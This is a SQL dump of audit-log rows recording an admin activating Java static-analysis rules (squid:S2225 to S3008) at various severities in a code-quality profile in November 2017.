INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1648, '2017-11-20 11:00:20.965', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgllbbGRdfPp-q3T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1649, '2017-11-20 11:00:21.028', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgmkbbGRdfPp-q3U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1650, '2017-11-20 11:00:21.067', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgnLbbGRdfPp-q3V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1651, '2017-11-20 11:00:21.176', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgo4bbGRdfPp-q3W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1652, '2017-11-20 11:00:21.259', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgqLbbGRdfPp-q3X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1653, '2017-11-20 11:00:21.313', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgrBbbGRdfPp-q3Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1654, '2017-11-20 11:00:21.343', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgrfbbGRdfPp-q3Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1655, '2017-11-20 11:00:21.379', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgsDbbGRdfPp-q3a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1656, '2017-11-20 11:00:21.407', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgsfbbGRdfPp-q3b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1657, '2017-11-20 11:00:21.443', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgtDbbGRdfPp-q3c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1658, '2017-11-20 11:00:21.479', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgtnbbGRdfPp-q3d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1659, '2017-11-20 11:00:21.532', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgucbbGRdfPp-q3e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1660, '2017-11-20 11:00:21.578', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgvKbbGRdfPp-q3f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1661, '2017-11-20 11:00:21.61', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgvqbbGRdfPp-q3g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1662, '2017-11-20 11:00:21.635', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgwDbbGRdfPp-q3h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1663, '2017-11-20 11:00:21.687', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgw3bbGRdfPp-q3i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1664, '2017-11-20 11:00:21.732', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgxkbbGRdfPp-q3j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1665, '2017-11-20 11:00:21.781', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgyVbbGRdfPp-q3k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1666, '2017-11-20 11:00:21.834', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgzKbbGRdfPp-q3l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1667, '2017-11-20 11:00:21.881', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgz5bbGRdfPp-q3m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1668, '2017-11-20 11:00:21.938', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg0ybbGRdfPp-q3n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1669, '2017-11-20 11:00:22.007', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg13bbGRdfPp-q3o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1670, '2017-11-20 11:00:22.121', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg3pbbGRdfPp-q3p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1671, '2017-11-20 11:00:22.249', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg5pbbGRdfPp-q3q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1672, '2017-11-20 11:00:22.324', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg60bbGRdfPp-q3r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1673, '2017-11-20 11:00:22.389', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg71bbGRdfPp-q3s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1674, '2017-11-20 11:00:22.435', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg8jbbGRdfPp-q3t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1675, '2017-11-20 11:00:22.482', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg9SbbGRdfPp-q3u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1676, '2017-11-20 11:00:22.527', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg9_bbGRdfPp-q3v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1677, '2017-11-20 11:00:22.562', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg-ibbGRdfPp-q3w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1678, '2017-11-20 11:00:22.6', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg_IbbGRdfPp-q3x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1679, '2017-11-20 11:00:22.623', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg_fbbGRdfPp-q3y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1680, '2017-11-20 11:00:22.645', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFg_1bbGRdfPp-q3z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1681, '2017-11-20 11:00:22.679', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhAXbbGRdfPp-q30');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1682, '2017-11-20 11:00:22.72', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhBAbbGRdfPp-q31');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1683, '2017-11-20 11:00:22.773', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhB1bbGRdfPp-q32');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1684, '2017-11-20 11:00:22.853', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhDFbbGRdfPp-q33');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1685, '2017-11-20 11:00:22.886', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhDmbbGRdfPp-q34');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1686, '2017-11-20 11:00:22.935', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhEXbbGRdfPp-q35');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1687, '2017-11-20 11:00:22.979', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhFDbbGRdfPp-q36');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1688, '2017-11-20 11:00:23.033', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhF5bbGRdfPp-q37');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1689, '2017-11-20 11:00:23.092', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhG0bbGRdfPp-q38');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1690, '2017-11-20 11:00:23.165', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhH9bbGRdfPp-q39');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1691, '2017-11-20 11:00:23.203', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhIjbbGRdfPp-q3-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1692, '2017-11-20 11:00:23.238', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhJGbbGRdfPp-q3_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1693, '2017-11-20 11:00:23.266', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhJibbGRdfPp-q4A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1694, '2017-11-20 11:00:23.302', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhKGbbGRdfPp-q4B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1695, '2017-11-20 11:00:23.329', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhKhbbGRdfPp-q4C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1696, '2017-11-20 11:00:23.38', 'admin', 'key=java-cb80d362-ba5b-4e40-8,bb-f4adb2124c21-lena-qp_16-11716:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhLUbbGRdfPp-q4D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1697, '2017-11-20 11:00:23.407', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhLvbbGRdfPp-q4E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1698, '2017-11-20 11:00:23.441', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhMRbbGRdfPp-q4F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1699, '2017-11-20 11:00:23.481', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhM5bbGRdfPp-q4G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1700, '2017-11-20 11:00:23.538', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhNybbGRdfPp-q4H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1701, '2017-11-20 11:00:23.566', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhOObbGRdfPp-q4I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1702, '2017-11-20 11:00:23.624', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhPIbbGRdfPp-q4J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1703, '2017-11-20 11:00:23.651', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhPjbbGRdfPp-q4K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1704, '2017-11-20 11:00:23.686', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhQGbbGRdfPp-q4L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1705, '2017-11-20 11:00:23.722', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhQqbbGRdfPp-q4M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1706, '2017-11-20 11:00:23.774', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhRebbGRdfPp-q4N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1707, '2017-11-20 11:00:23.81', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhSCbbGRdfPp-q4O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1708, '2017-11-20 11:00:23.85', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhSpbbGRdfPp-q4P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1709, '2017-11-20 11:00:23.887', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFhTPbbGRdfPp-q4Q');
